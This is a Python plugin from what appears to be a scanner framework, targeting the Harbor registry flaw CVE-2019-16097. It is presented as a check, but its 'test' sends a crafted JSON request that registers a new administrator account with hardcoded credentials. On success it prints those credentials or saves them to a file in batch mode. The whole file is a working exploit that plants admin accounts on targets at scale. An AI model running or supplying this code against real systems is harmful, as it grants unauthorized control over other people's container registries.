#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2019_16097:
    def test(self,url):
        bug_url = url + "/api/users"
        payload = '{"username":"eviladan0s","email":"eviladan0s@gmail.com","realname":"eviladan0s","password":"eviladan0s123QAQ","comment":"1","has_admin_role":true}'
        header = {"Content-Type": "application/json", "Accept": "application/json","User-Agent":self.headers["User-Agent"]}
        try:
            r = requests.post(bug_url, data=payload, headers=header,verify=self.ssl,proxies=self.proxy,timeout=self.timeout)
            if r.status_code == 201:
                OutPrintInfoSuc("Harbor", f'目标存在CVE-2019-16097任意管理员注册漏洞: {url}')
                if not self.batch:
                     OutPrintInfo("Harbor", "username: eviladan0s   password: eviladan0s123QAQ")
                else:
                    OutPutFile("harbor_2019_16097.txt", f'目标存在CVE-2019-16097任意管理员注册漏洞: {url} | username: eviladan0s   password: eviladan0s123QAQ')
            else:
                if not self.batch:
                    OutPrintInfo("Harbor", f'目标不存在CVE-2019-16097任意管理员注册漏洞')

        except Exception as e:
            if not self.batch:
                OutPrintInfo("Harbor",'目标请求出错')



    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Harbor", '开始检测CVE-2019-16097任意管理员注册漏洞...')
        self.test(url)
        if not self.batch:
            OutPrintInfo("Harbor", 'CVE-2019-16097任意管理员注册漏洞检测结束')



